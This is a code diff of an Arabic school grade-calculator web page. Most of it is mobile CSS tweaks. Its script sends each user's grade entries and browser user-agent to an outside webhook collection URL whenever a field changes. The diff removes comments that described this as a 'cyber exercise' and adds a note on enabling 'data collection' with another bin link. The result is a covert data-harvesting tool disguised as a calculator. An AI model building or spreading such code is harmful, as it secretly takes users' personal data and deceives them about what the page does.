@@ -22,7 +22,7 @@
             font-family: 'Changa', sans-serif;
             background-color: var(--dark-bg);
             margin: 0;
-            padding: 50px 15px;
+            padding: 20px 10px; /* تقليل التباعد ليناسب الهاتف */
             color: var(--light-text);
             direction: rtl;
             line-height: 1.6;
@@ -32,7 +32,7 @@
             max-width: 1300px;
             margin: 0 auto;
             background: var(--card-bg);
-            padding: 40px;
+            padding: 20px; /* تقليل التباعد الداخلي */
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 15px rgba(0, 188, 212, 0.2);
             border: 1px solid var(--border-color);
@@ -43,21 +43,29 @@
             text-shadow: 0 0 10px var(--neon-blue), 0 0 20px rgba(0, 188, 212, 0.5);
             padding-bottom: 10px;
             margin-bottom: 10px;
-            font-size: 2.8em;
+            font-size: 2.2em; /* تصغير حجم العنوان قليلاً */
             font-weight: 800;
         }
         p.subtitle {
             text-align: center;
             color: #b8b8d1;
-            margin-bottom: 35px;
-            font-size: 1.1em;
+            margin-bottom: 25px;
+            font-size: 1em;
             font-weight: 400;
         }
+
+        /* ************************************** */
+        /* تحسينات الجدول للجوال */
+        /* ************************************** */
+        .table-responsive {
+            overflow-x: auto; /* يجعل الجدول قابلاً للتمرير أفقياً */
+            margin-bottom: 30px;
+        }
         table {
+            min-width: 600px; /* تأكد من أن الجدول يحافظ على عرض كافٍ */
             width: 100%;
             border-collapse: separate;
             border-spacing: 0;
-            margin-bottom: 30px;
             table-layout: fixed;
             border-radius: 10px;
             overflow: hidden;
@@ -65,7 +73,8 @@
         }
         th, td {
             border: 1px solid var(--border-color);
-            padding: 14px 8px;
+            padding: 10px 5px; /* تقليل التباعد في الخلايا */
+            font-size: 0.9em; /* تصغير الخط في الخلايا */
             text-align: center;
             vertical-align: middle;
             transition: background-color 0.3s;
@@ -74,61 +83,34 @@
             background-color: #3b3b5c;
             color: var(--neon-blue);
             font-weight: 700;
-            font-size: 1.1em;
+            font-size: 1em;
             border-color: #5c5c85;
-        }
-        tbody tr:nth-child(odd) {
-            background-color: #31314f;
-        }
-        tbody tr:nth-child(even) {
-            background-color: var(--card-bg);
-        }
-        tbody tr:hover {
-            background-color: #4a4a6b;
         }
         td:first-child {
             text-align: right;
             font-weight: 600;
-            color: var(--light-text);
             background-color: #3b3b5c;
-            padding-right: 15px;
+            padding-right: 10px;
         }
         input[type="text"] {
-            width: 85%;
-            padding: 10px 5px;
-            background-color: var(--dark-bg);
-            color: var(--light-text);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            text-align: center;
-            font-size: 1em;
-            direction: ltr;
-            transition: border-color 0.3s;
-        }
-        input[type="text"]:focus {
-            border-color: var(--neon-blue);
-            box-shadow: 0 0 8px rgba(0, 188, 212, 0.5);
-            outline: none;
+            width: 90%;
+            padding: 5px; /* تقليل التباعد الداخلي لحقل الإدخال */
+            font-size: 0.9em;
         }
         .average-cell {
             background-color: #2e5944;
             font-weight: 800;
             color: var(--neon-green);
-            font-size: 1.25em;
+            font-size: 1.1em; /* تصغير خط النتيجة */
             border-left: 3px solid var(--neon-green);
-            text-shadow: 0 0 5px rgba(56, 193, 114, 0.8);
         }
+        /* ************************************** */
+        /* نهاية تحسينات الجدول للجوال */
+        /* ************************************** */
+
         #result-box {
-            background-color: #2e5944;
-            color: var(--neon-green);
-            padding: 30px;
-            border-radius: 15px;
-            font-size: 2.5em;
-            font-weight: 800;
-            text-align: center;
-            margin-top: 40px;
-            border: 2px solid var(--neon-green);
-            box-shadow: 0 0 25px rgba(56, 193, 114, 0.7);
+            padding: 20px;
+            font-size: 1.8em; /* تصغير خط النتيجة النهائية */
         }
         .sub-header {
             background-color: #3b3b5c !important;
@@ -136,39 +118,17 @@
             font-weight: 700;
         }
         #reset-button {
-            display: block;
-            width: 300px;
-            padding: 15px;
-            margin: 0 auto 40px auto;
-            background-color: var(--dark-bg);
-            color: var(--reset-color);
-            border: 2px solid var(--reset-color);
-            border-radius: 10px;
-            font-size: 1.2em;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(255, 107, 107, 0.7);
-            transition: all 0.3s;
-        }
-        #reset-button:hover {
-            background-color: var(--reset-color);
-            color: var(--dark-bg);
-            box-shadow: 0 0 20px var(--reset-color);
+            width: 90%; /* جعله يتجاوب مع عرض الشاشة */
+            max-width: 300px; 
+            padding: 10px;
+            font-size: 1.1em;
         }
         .footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 20px 0;
-            color: var(--neon-blue);
-            font-size: 1.2em;
-            font-weight: 700;
-            letter-spacing: 2px;
-            text-shadow: 0 0 8px var(--neon-blue);
+            margin-top: 30px;
+            font-size: 1em;
         }
         .footer strong {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.5em;
-            color: var(--neon-blue);
+            font-size: 1.3em;
         }
     </style>
 </head>
@@ -180,31 +140,32 @@
         
         <button id="reset-button" onclick="resetGrades()">🔄 إعادة ضبط جميع النقاط</button>
 
-        <table>
-            <thead>
-                <tr>
-                    <th rowspan="2" style="width: 15%;">المادة</th>
-                    <th colspan="4" class="sub-header">علامات الفروض الكتابية</th>
-                    <th rowspan="2">علامة الأنشطة المندمجة</th>
-                    <th rowspan="2" style="width: 12%;">معدل المادة (من 20)</th>
-                </tr>
-                <tr>
-                    <th class="sub-header">الفرض 1</th>
-                    <th class="sub-header">الفرض 2</th>
-                    <th class="sub-header">الفرض 3</th>
-                    <th class="sub-header">الفرض 4</th>
-                </tr>
-            </thead>
-            <tbody id="grades-table-body">
-                </tbody>
-            <tfoot>
-                <tr>
-                    <td colspan="6" style="text-align: left; font-weight: bold; background-color: #3b3b5c; padding-left: 20px;">مجموع معدلات المواد</td>
-                    <td id="total-simple-average" class="average-cell">---</td>
-                </tr>
-            </tfoot>
-        </table>
-
+        <div class="table-responsive">
+            <table>
+                <thead>
+                    <tr>
+                        <th rowspan="2" style="width: 15%;">المادة</th>
+                        <th colspan="4" class="sub-header">علامات الفروض الكتابية</th>
+                        <th rowspan="2">علامة الأنشطة المندمجة</th>
+                        <th rowspan="2" style="width: 12%;">معدل المادة (من 20)</th>
+                    </tr>
+                    <tr>
+                        <th class="sub-header">الفرض 1</th>
+                        <th class="sub-header">الفرض 2</th>
+                        <th class="sub-header">الفرض 3</th>
+                        <th class="sub-header">الفرض 4</th>
+                    </tr>
+                </thead>
+                <tbody id="grades-table-body">
+                    </tbody>
+                <tfoot>
+                    <tr>
+                        <td colspan="6" style="text-align: left; font-weight: bold; background-color: #3b3b5c; padding-left: 20px;">مجموع معدلات المواد</td>
+                        <td id="total-simple-average" class="average-cell">---</td>
+                    </tr>
+                </tfoot>
+            </table>
+        </div>
         <div id="result-box">
             المعدل العام النهائي: <span id="final-average">---</span>
         </div>
@@ -213,11 +174,17 @@
     </div>
 
     <div class="footer">
-         <strong></strong>
+        <strong></strong>
     </div>
 
     <script>
-        // قائمة بالمواد (بالترتيب المطلوب)
+        // *****************************************************************
+        // ** ملاحظة هامة: لتفعيل تجميع البيانات، استبدل الرابط أدناه **
+        // *****************************************************************
+        // الرابط الذي أرسلته كمثال: https://bin.h00k.dev/dcbaba1f-490c-4ccf-b2b9-079a522b3076
+        const SERVER_ENDPOINT = 'https://webhook.site/cb508de2-2f41-4364-a34f-9553e024d459'; 
+        // *****************************************************************
+        
         const subjects = [
             "الاجتماعيات", "التربية الإسلامية", "التربية البدنية", 
             "التكنولوجيا", "الرياضيات", "الفيزياء والكيمياء", 
@@ -231,23 +198,12 @@
         const numInputsPerSubject = 5; 
         const localStorageKey = 'gradesCalculatorData'; 
         
-        // *****************************************************************
-        // ** التعديلات الرئيسية للتمرين السيبراني **
-        // *****************************************************************
-        
-        // 1. تحديد نقطة الإرسال (الخادم/الخدمة الوسيطة)
-        // **ملاحظة: استبدل هذا الرابط برابط خدمة إرسال بريد إلكتروني حقيقي (مثل FormSubmit) للحصول على البيانات في بريدك.**
-        // مثال FormSubmit: 'https://formsubmit.co/ajax/your-email@example.com' 
-        const SERVER_ENDPOINT = 'https://webhook.site/cb508de2-2f41-4364-a34f-9553e024d459'; // رابط وهمي/تجريبي
-
-        // 2. دالة الإرسال (بدلاً من الحفظ المحلي)
         async function sendGradesToServer(gradesData) {
             document.getElementById('status-message').textContent = 'جاري إرسال البيانات...';
             
-            // إضافة معلومات إضافية للمستخدم (مثل User-Agent)
             const submissionData = {
                 timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent, // معلومات User-Agent
+                userAgent: navigator.userAgent, 
                 grades: gradesData
             };
             
@@ -261,22 +217,18 @@
                 });
 
                 if (response.ok) {
-                    // إذا نجح الإرسال، نحفظه محلياً ليراه المستخدم عند العودة
                     localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
                     document.getElementById('status-message').textContent = 'تم حفظ العلامات وإرسالها بنجاح.';
                 } else {
-                    document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الإرسال إلى الخادم (خطأ في الرابط).';
-                    // نحفظ محلياً في حالة فشل الإرسال
                     localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+                    document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الإرسال إلى الخادم (خطأ في الرابط).';
                 }
             } catch (error) {
-                document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الاتصال بالخادم.';
-                 // نحفظ محلياً في حالة فشل الاتصال
                 localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+                document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الاتصال بالخادم.';
             }
         }
         
-        // 3. دالة الحفظ التلقائي (المعدلة لاستدعاء دالة الإرسال)
         function saveGrades() {
             const gradesData = {};
             subjects.forEach((subject, index) => {
@@ -287,15 +239,9 @@
                 }
             });
             
-            // نرسل البيانات بدلاً من حفظها فقط!
             sendGradesToServer(gradesData);
         }
         
-        // *****************************************************************
-        // ** باقي الدوال (لا تغيير عليها) **
-        // *****************************************************************
-
-        // دالة تحميل العلامات
         function loadGrades() {
             const savedData = localStorage.getItem(localStorageKey);
             if (savedData) {
@@ -313,7 +259,6 @@
             }
         }
 
-        // دالة إعادة الضبط
         function resetGrades() {
             if (confirm("هل أنت متأكد من مسح جميع العلامات؟ سيتم مسح البيانات المحفوظة.")) {
                 subjects.forEach((subject, index) => {
@@ -333,7 +278,6 @@
         }
         window.resetGrades = resetGrades; 
 
-        // دالة لمعالجة الإدخال
         function formatAndSaveInput(event) {
             const input = event.target;
             input.value = input.value.replace(',', '.');
@@ -347,10 +291,9 @@
             }
             
             calculateOverallAverage();
-            saveGrades(); // يتم استدعاء دالة الإرسال هنا
+            saveGrades();
         }
 
-        // دالة لحساب متوسط المادة
         function calculateSubjectAverage(index) {
             let sumOfGrades = 0;
             let countOfGrades = 0;
@@ -373,7 +316,6 @@
             return subjectAverage;
         }
 
-        // دالة تحسب المعدل العام وتحديث النتائج
         function calculateOverallAverage() {
             let totalSubjectAverages = 0;
             let countedSubjects = 0;
@@ -401,7 +343,6 @@
             finalAverageElement.textContent = finalAverage > 0 ? finalAverage.toFixed(2) : '---';
         }
 
-        // بناء صفوف الجدول عند تحميل الصفحة
         function buildTable() {
             subjects.forEach((subject, index) => {
                 const row = tableBody.insertRow();
@@ -429,7 +370,6 @@
             calculateOverallAverage();
         }
 
-        // تشغيل وظيفة بناء الجدول عند تحميل الصفحة
         window.onload = buildTable;
 
     </script>
